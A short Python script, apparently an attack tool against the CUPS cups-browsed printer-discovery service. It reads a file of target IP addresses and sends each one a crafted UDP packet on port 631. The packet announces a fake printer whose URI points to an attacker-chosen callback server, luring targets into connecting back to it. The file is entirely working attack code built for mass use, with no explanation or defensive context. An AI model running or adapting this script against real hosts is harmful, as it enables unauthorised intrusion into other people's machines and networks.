#!/usr/bin/env python3
import socket
import threading
import time
import sys

from ippserver.server import IPPServer
import ippserver.behaviour as behaviour
from ippserver.server import IPPRequestHandler
from ippserver.constants import (
    OperationEnum, StatusCodeEnum, SectionEnum, TagEnum
)
from ippserver.parsers import Integer, Enum, Boolean
from ippserver.request import IppRequest
        

def send_browsed_packet(ip, callback_host):
    print("sending udp packet to %s:%d ..." % (ip, 631))

    printer_type = 0x00
    printer_state = 0x03
    printer_uri = 'http://%s:80/printers/NAME' % callback_host
    printer_location = 'Office HQ'
    printer_info = 'Printer'

    message = bytes('%x %x %s "%s" "%s"' %
                    (printer_type,
                     printer_state,
                     printer_uri,
                     printer_location,
                     printer_info), 'UTF-8')

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(message, (ip, 631))

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("%s <CALLBACK_SERVER> <TARGET_LIST>" % sys.argv[0])
        quit()

    CALLBACK_SERVER = sys.argv[1]
    INPUT_LIST = sys.argv[2]

    with open(INPUT_LIST) as f:
        lines = f.read().splitlines()

    print(lines)
    
    for i in lines:
        send_browsed_packet(i, CALLBACK_SERVER)
        time.sleep(0.1)